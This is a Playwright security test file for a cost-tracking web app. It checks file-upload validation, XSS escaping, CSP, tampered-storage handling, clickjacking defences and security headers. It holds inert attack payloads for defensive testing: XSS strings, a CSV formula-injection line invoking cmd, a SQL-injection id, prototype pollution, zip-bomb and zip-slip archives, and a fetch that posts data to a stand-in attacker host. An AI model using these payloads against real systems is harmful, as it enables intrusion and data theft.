/**
 * Security tests for the web edition, with safe test data only.
 *
 *   npm run test:security                         # local: dist/ served with vercel.json's headers
 *   TARGET_URL=https://… npm run test:security    # the deployed site
 *
 * 1. Invalid and malicious file uploads are refused before parsing.
 * 2. Stored XSS: HTML/JS in names is shown as text; injected inline script is blocked by CSP.
 * 3. Unauthorised data access: forged/tampered storage is rejected, another origin cannot
 *    read the data, and another site cannot frame the app (clickjacking).
 * 4. Excessive requests: a burst against the host, and a flood of imports in the app.
 * 5. Security headers are present.
 *
 * Nothing here is destructive: every payload is inert test data, and the request burst
 * is small (100 GETs of the app shell).
 */
import fs from 'node:fs'
import http from 'node:http'
import path from 'node:path'
import { chromium } from 'playwright-core'
import { distDir, findChromium, outDir, root, sleep } from './harness.mjs'

const STORAGE_KEY = 'ev-cost:data:v1'
const results = []
const log = []
function check(name, ok, detail = '') {
  results.push({ name, ok: Boolean(ok), detail })
  const line = `${ok ? '  ✓' : '  ✗'} ${name}${detail ? `  (${detail})` : ''}`
  log.push(line)
  process.stdout.write(`${line}\n`)
}
function section(title) {
  log.push(`\n${title}`)
  process.stdout.write(`\n${title}\n`)
}

// ─────────────── A static host that sends the same headers as vercel.json ───────────────
const vercel = JSON.parse(fs.readFileSync(path.join(root, 'vercel.json'), 'utf8'))
const headerRules = vercel.headers.map((rule) => ({
  re: new RegExp(`^${rule.source}$`),
  headers: rule.headers
}))
const TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.js': 'text/javascript; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.svg': 'image/svg+xml',
  '.woff2': 'font/woff2'
}

function serve(handler) {
  const server = http.createServer(handler)
  return new Promise((resolve) =>
    server.listen(0, '127.0.0.1', () =>
      resolve({
        url: `http://127.0.0.1:${server.address().port}/`,
        close: () => new Promise((r) => (server.closeAllConnections?.(), server.close(() => r())))
      })
    )
  )
}

function serveDistWithHeaders() {
  return serve((req, res) => {
    const urlPath = decodeURIComponent(new URL(req.url, 'http://x').pathname)
    let file = path.normalize(path.join(distDir, urlPath))
    if (!file.startsWith(distDir)) return res.writeHead(403).end()
    if (fs.existsSync(file) && fs.statSync(file).isDirectory()) file = path.join(file, 'index.html')
    if (!fs.existsSync(file)) return res.writeHead(404).end('Not found')
    const headers = { 'content-type': TYPES[path.extname(file)] ?? 'application/octet-stream' }
    for (const rule of headerRules) {
      if (rule.re.test(urlPath)) for (const h of rule.headers) headers[h.key] = h.value
    }
    // upgrade-insecure-requests would break plain-http localhost; it only matters on https.
    headers['Content-Security-Policy'] = headers['Content-Security-Policy'].replace(
      /; upgrade-insecure-requests/,
      ''
    )
    res.writeHead(200, headers)
    fs.createReadStream(file).pipe(res)
  })
}

// ───────────────────────── Crafted, inert test files ─────────────────────────
function buildZip(entries) {
  const enc = new TextEncoder()
  const locals = []
  const centrals = []
  let offset = 0
  for (const e of entries) {
    const name = enc.encode(e.name)
    const data = enc.encode(e.data ?? '')
    const declared = e.declaredSize ?? data.length
    const local = Buffer.alloc(30 + name.length + data.length)
    local.writeUInt32LE(0x04034b50, 0)
    local.writeUInt32LE(data.length, 18)
    local.writeUInt32LE(declared, 22)
    local.writeUInt16LE(name.length, 26)
    local.set(name, 30)
    local.set(data, 30 + name.length)
    const central = Buffer.alloc(46 + name.length)
    central.writeUInt32LE(0x02014b50, 0)
    central.writeUInt32LE(data.length, 20)
    central.writeUInt32LE(declared, 24)
    central.writeUInt16LE(name.length, 28)
    central.writeUInt32LE(offset, 42)
    central.set(name, 46)
    locals.push(local)
    centrals.push(central)
    offset += local.length
  }
  const dirSize = centrals.reduce((s, c) => s + c.length, 0)
  const eocd = Buffer.alloc(22)
  eocd.writeUInt32LE(0x06054b50, 0)
  eocd.writeUInt16LE(entries.length, 8)
  eocd.writeUInt16LE(entries.length, 10)
  eocd.writeUInt32LE(dirSize, 12)
  eocd.writeUInt32LE(offset, 16)
  return Buffer.concat([...locals, ...centrals, eocd])
}
const XLSX_PARTS = [
  { name: '[Content_Types].xml', data: '<Types/>' },
  { name: 'xl/workbook.xml', data: '<workbook/>' }
]

const UPLOADS = [
  {
    label: 'a program with a .exe extension',
    name: 'payload.exe',
    bytes: Buffer.from('MZ\x90\x00'),
    expect: /Choose a \.csv or \.xlsx file/
  },
  {
    label: 'a double extension (costs.csv.exe)',
    name: 'costs.csv.exe',
    bytes: Buffer.from('a,b'),
    expect: /Choose a \.csv or \.xlsx file/
  },
  {
    label: 'a Windows program renamed to .csv',
    name: 'invoice.csv',
    bytes: Buffer.from([0x4d, 0x5a, 0x90, 0x00, 0x03, 0x00]),
    expect: /Windows program, not a CSV/
  },
  {
    label: 'a PDF renamed to .csv',
    name: 'report.csv',
    bytes: Buffer.from('%PDF-1.7\n%test'),
    expect: /PDF, not a CSV/
  },
  {
    label: 'plain text renamed to .xlsx',
    name: 'costs.xlsx',
    bytes: Buffer.from('Module Name,BAC\nAPI,1000'),
    expect: /not an Excel workbook/
  },
  {
    label: 'a macro-enabled workbook renamed to .xlsx',
    name: 'budget.xlsx',
    bytes: buildZip([...XLSX_PARTS, { name: 'xl/vbaProject.bin', data: 'inert' }]),
    expect: /contains macros/
  },
  {
    label: 'a zip bomb (declares 858 MB uncompressed)',
    name: 'bomb.xlsx',
    bytes: buildZip([
      ...XLSX_PARTS,
      { name: 'xl/worksheets/sheet1.xml', data: 'x'.repeat(100), declaredSize: 900_000_000 }
    ]),
    expect: /expands to 858 MB/
  },
  {
    label: 'a zip-slip path (../../evil.sh)',
    name: 'slip.xlsx',
    bytes: buildZip([...XLSX_PARTS, { name: '../../evil.sh', data: 'echo inert' }]),
    expect: /unsafe file paths/
  },
  {
    label: 'an empty file',
    name: 'empty.csv',
    bytes: Buffer.alloc(0),
    expect: /file is empty/
  }
]

// ──────────────────────────────── Run ────────────────────────────────
fs.mkdirSync(outDir, { recursive: true })
const target = process.env.TARGET_URL?.trim()
const local = target ? null : await serveDistWithHeaders()
const appUrl = target ? (target.endsWith('/') ? target : `${target}/`) : local.url
const attacker = await serve((req, res) => {
  res.writeHead(200, { 'content-type': 'text/html' })
  res.end(`<!doctype html><title>attacker</title><iframe id="victim" src="${appUrl}"></iframe>`)
})
const browser = await chromium.launch({ executablePath: findChromium() })
process.stdout.write(`Target ${appUrl} · Chromium ${browser.version()}\n`)

async function newPage() {
  const context = await browser.newContext({ viewport: { width: 1440, height: 900 } })
  await context.addInitScript(() => {
    window.__cspViolations = []
    document.addEventListener('securitypolicyviolation', (e) =>
      window.__cspViolations.push(`${e.violatedDirective}`)
    )
  })
  const page = await context.newPage()
  return { context, page }
}

const clickText = (page, selector, label) =>
  page.evaluate(
    ([sel, txt]) => {
      const el = [...document.querySelectorAll(sel)].find((e) =>
        e.textContent.trim().startsWith(txt)
      )
      el?.click()
      return Boolean(el)
    },
    [selector, label]
  )

/** Drops a file on the import dialog's drop zone, as a user would. */
async function dropFile(page, name, bytes) {
  await page.evaluate(
    ([fileName, data]) => {
      const dt = new DataTransfer()
      dt.items.add(new File([new Uint8Array(data)], fileName))
      const zone = document.querySelector('[role=dialog] button.border-dashed')
      zone.dispatchEvent(
        new DragEvent('drop', { dataTransfer: dt, bubbles: true, cancelable: true })
      )
    },
    [name, [...bytes]]
  )
  await sleep(500)
  return page.evaluate(() => document.querySelector('[role=dialog]')?.textContent ?? '')
}

try {
  // ───────────── 1. Invalid file uploads ─────────────
  {
    section('1. Invalid and malicious file uploads are refused')
    const { context, page } = await newPage()
    await page.goto(appUrl)
    await page.waitForSelector('#status-headline')
    await clickText(page, 'header button', 'Import')
    await sleep(300)
    for (const u of UPLOADS) {
      const text = await dropFile(page, u.name, u.bytes)
      const match = text.match(u.expect)
      if (u.name === 'bomb.xlsx') {
        await page.screenshot({ path: path.join(outDir, 'security-upload-refused.png') })
      }
      check(
        `refuses ${u.label}`,
        match && !/[1-9]\d* ready to import/.test(text),
        match?.[0] ?? text.slice(0, 90)
      )
    }

    const formulaCsv = [
      'Module Name,Category,BAC,Planned %,Actual %,Actual Cost,Notes',
      '=HYPERLINK("http://example.invalid","click"),Core,1000,50,40,500,@SUM(A1:A9)',
      "  +cmd|' /C calc'!A0,Core,1000,50,40,500,-2+3"
    ].join('\n')
    const text = await dropFile(page, 'formulas.csv', Buffer.from(formulaCsv))
    check(
      'neutralises spreadsheet formula injection in a CSV (CWE-1236)',
      /formula prefix(es)? removed/.test(text),
      text.match(/\d+ formula prefix(es)? removed/)?.[0] ?? text.slice(0, 90)
    )
    await page.screenshot({ path: path.join(outDir, 'security-formula-sanitised.png') })
    await context.close()
  }

  // ───────────── 2. Stored XSS and CSP ─────────────
  {
    section('2. Cross-site scripting (XSS)')
    const { context, page } = await newPage()
    await page.goto(appUrl)
    await page.waitForSelector('#status-headline')
    const payloads = [
      '<img src=x onerror="window.__xss=1">',
      '<script>window.__xss=2</script>',
      '"><svg onload="window.__xss=3">'
    ]
    // Plant the payloads as stored data (the strongest position an attacker could get).
    await page.evaluate(
      ([key, names]) => {
        const data = JSON.parse(localStorage.getItem(key))
        const pid = data.projects[0].id
        names.forEach((taskName, i) =>
          data.items.push({
            id: 9000 + i,
            projectId: pid,
            taskName,
            category: taskName,
            bac: 1000,
            plannedPercent: 50,
            actualPercent: 40,
            actualCost: 500,
            notes: taskName,
            createdAt: null
          })
        )
        data.projects[0].name = names[0]
        data.nextItemId = 9100
        localStorage.setItem(key, JSON.stringify(data))
      },
      [STORAGE_KEY, payloads]
    )
    for (const hash of ['#/overview', '#/packages', '#/actions', '#/report']) {
      await page.goto(`${appUrl}${hash}`)
      await page.reload()
      await sleep(500)
    }
    const xss = await page.evaluate(() => window.__xss ?? null)
    check(
      'HTML/JS in stored names never executes (React escapes output)',
      xss === null,
      `window.__xss = ${xss}`
    )
    const shownLiterally = await page.evaluate(() =>
      document.body.textContent.includes('<img src=x onerror=')
    )
    check('the payload is displayed as plain text', shownLiterally)
    await page.screenshot({ path: path.join(outDir, 'security-xss-as-text.png') })

    // Defence in depth: even if markup got into the DOM, CSP blocks inline script.
    await page.evaluate(() => {
      const div = document.createElement('div')
      div.innerHTML = '<img src="data:," onerror="window.__csp=1">'
      document.body.appendChild(div)
      const s = document.createElement('script')
      s.textContent = 'window.__csp = 2'
      document.body.appendChild(s)
    })
    await sleep(300)
    const csp = await page.evaluate(() => ({
      ran: window.__csp ?? null,
      v: window.__cspViolations
    }))
    check(
      'CSP blocks injected inline script and event handlers',
      csp.ran === null && csp.v.some((d) => d.startsWith('script-src')),
      `ran=${csp.ran}, violations=${[...new Set(csp.v)].join(',')}`
    )
    const exfil = await page.evaluate(async () => {
      try {
        await fetch('https://attacker.example.invalid/steal', { method: 'POST', body: 'x' })
        return 'sent'
      } catch {
        return 'blocked'
      }
    })
    check('CSP connect-src stops data being sent to another host', exfil === 'blocked', exfil)
    await context.close()
  }

  // ───────────── 3. Unauthorised data access / tampering ─────────────
  {
    section('3. Unauthorised data access and tampering')
    const { context, page } = await newPage()
    await page.goto(appUrl)
    await page.waitForSelector('#status-headline')
    await page.evaluate((key) => {
      const data = JSON.parse(localStorage.getItem(key))
      data.items.push(
        // A row pointing at a project that does not exist
        {
          id: 7001,
          projectId: 999,
          taskName: 'Orphan row',
          category: 'X',
          bac: 1,
          plannedPercent: 1,
          actualPercent: 1,
          actualCost: 1
        },
        // Forged ids
        {
          id: -5,
          projectId: data.projects[0].id,
          taskName: 'Negative id',
          category: 'X',
          bac: 1,
          plannedPercent: 1,
          actualPercent: 1,
          actualCost: 1
        },
        {
          id: '1 OR 1=1',
          projectId: data.projects[0].id,
          taskName: 'SQLi id',
          category: 'X',
          bac: 1,
          plannedPercent: 1,
          actualPercent: 1,
          actualCost: 1
        },
        // Out-of-range numbers
        {
          id: 7002,
          projectId: data.projects[0].id,
          taskName: 'Absurd numbers',
          category: 'X',
          bac: -1e9,
          plannedPercent: 500,
          actualPercent: -50,
          actualCost: 'NaN'
        }
      )
      // Prototype-pollution attempt
      const raw = JSON.stringify(data).replace(/^\{/, '{"__proto__":{"polluted":true},')
      localStorage.setItem(key, raw)
    }, STORAGE_KEY)
    await page.reload()
    await page.waitForSelector('#status-headline')
    await page.goto(`${appUrl}#/packages`)
    await sleep(500)
    const body = await page.evaluate(() => document.body.textContent)
    check('rows that reference another project are dropped', !body.includes('Orphan row'))
    check(
      'rows with forged ids (negative, "1 OR 1=1") are dropped',
      !body.includes('Negative id') && !body.includes('SQLi id')
    )
    // The raw tampered text stays in storage; what matters is that the app normalises it on read.
    const absurdRow = await page.evaluate(
      () =>
        [...document.querySelectorAll('tbody tr')]
          .find((tr) => tr.textContent.includes('Absurd numbers'))
          ?.textContent.replace(/\s+/g, ' ') ?? null
    )
    check(
      'out-of-range values are clamped on read, not trusted',
      absurdRow !== null &&
        !absurdRow.includes('1,000,000,000') &&
        !absurdRow.includes('500%') &&
        !absurdRow.includes('-50%') &&
        !absurdRow.includes('NaN'),
      absurdRow ? absurdRow.slice(0, 110) : 'row missing'
    )
    const polluted = await page.evaluate(() => ({}).polluted ?? null)
    check('prototype pollution through stored JSON has no effect', polluted === null)

    // Another origin cannot read this origin's storage (same-origin policy).
    const other = await context.newPage()
    await other.goto(attacker.url)
    const stolen = await other.evaluate((key) => localStorage.getItem(key), STORAGE_KEY)
    check(
      'a page on another origin cannot read the saved projects',
      stolen === null,
      `got ${stolen === null ? 'null' : 'data'}`
    )
    const viaFrame = await other.evaluate(() => {
      try {
        return document
          .getElementById('victim')
          .contentWindow.localStorage.getItem('ev-cost:data:v1')
      } catch (e) {
        return `blocked (${e.name})`
      }
    })
    check('nor through an iframe', String(viaFrame).startsWith('blocked'), String(viaFrame))

    // Clickjacking: the app refuses to render inside another site's frame.
    await sleep(800)
    const frame = other.frames().find((f) => f !== other.mainFrame())
    const framed = frame
      ? await frame.evaluate(() => !!document.getElementById('root')).catch(() => false)
      : false
    check(
      'another site cannot frame the app (frame-ancestors / X-Frame-Options)',
      !framed,
      framed ? 'app rendered in frame' : 'frame blocked'
    )
    await other.screenshot({ path: path.join(outDir, 'security-clickjacking-blocked.png') })
    await context.close()
  }

  // ───────────── 4. Excessive requests ─────────────
  {
    section('4. Excessive requests')
    const N = 100
    const started = Date.now()
    const statuses = await Promise.all(
      Array.from({ length: N }, () =>
        fetch(appUrl, { headers: { 'cache-control': 'no-cache' } })
          .then((r) => r.status)
          .catch(() => 0)
      )
    )
    const ms = Date.now() - started
    const counts = statuses.reduce((m, s) => ((m[s] = (m[s] ?? 0) + 1), m), {})
    check(
      `a burst of ${N} requests leaves the site available`,
      (counts[200] ?? 0) + (counts[429] ?? 0) === N,
      `${JSON.stringify(counts)} in ${ms} ms${counts[429] ? ' (rate limited)' : ' (no 429s: the static host absorbs it)'}`
    )
    const after = await fetch(appUrl).then((r) => r.status)
    check('the site still answers normally afterwards', after === 200, `HTTP ${after}`)

    const { context, page } = await newPage()
    await page.goto(appUrl)
    await page.waitForSelector('#status-headline')
    // An oversized import (a runaway script or a malicious file) is capped at 5,000 rows.
    const capped = await page.evaluate(async () => {
      const big = ['Module Name,BAC,Planned %,Actual %,Actual Cost']
      for (let i = 0; i < 5100; i++) big.push(`Row ${i},100,50,40,50`)
      return big.join('\n')
    })
    await clickText(page, 'header button', 'Import')
    await sleep(300)
    const capText = await dropFile(page, 'huge.csv', Buffer.from(capped))
    check(
      'an import with more than 5,000 rows is refused',
      /more than 5,000 rows/.test(capText),
      capText.match(/more than 5,000 rows/)?.[0] ?? capText.slice(0, 90)
    )
    await context.close()
  }

  // ───────────── 5. Security headers ─────────────
  {
    section('5. Security headers')
    const res = await fetch(appUrl)
    const h = (k) => res.headers.get(k) ?? ''
    check(
      'Content-Security-Policy sets frame-ancestors none',
      /frame-ancestors 'none'/.test(h('content-security-policy'))
    )
    check(
      'Content-Security-Policy restricts scripts to self',
      /script-src 'self'/.test(h('content-security-policy'))
    )
    check('X-Frame-Options: DENY', h('x-frame-options') === 'DENY')
    check('X-Content-Type-Options: nosniff', h('x-content-type-options') === 'nosniff')
    check('Referrer-Policy: no-referrer', h('referrer-policy') === 'no-referrer')
    check(
      'Permissions-Policy denies camera, microphone and location',
      /camera=\(\)/.test(h('permissions-policy'))
    )
    if (appUrl.startsWith('https://')) {
      check(
        'Strict-Transport-Security is set',
        /max-age=\d+/.test(h('strict-transport-security')),
        h('strict-transport-security')
      )
      const insecure = await fetch(appUrl.replace('https://', 'http://'), { redirect: 'manual' })
      check(
        'plain HTTP redirects to HTTPS',
        [301, 308].includes(insecure.status),
        `HTTP ${insecure.status} → ${insecure.headers.get('location')}`
      )
    }
  }
} finally {
  await browser.close()
  await attacker.close()
  await local?.close()
}

const failed = results.filter((r) => !r.ok)
const summary = `\n${results.length - failed.length}/${results.length} security checks passed against ${appUrl}`
process.stdout.write(`${summary}\n`)
fs.writeFileSync(
  path.join(outDir, target ? 'security-results-deployed.txt' : 'security-results-local.txt'),
  `${log.join('\n')}\n${summary}\n`
)
process.exit(failed.length ? 1 : 0)
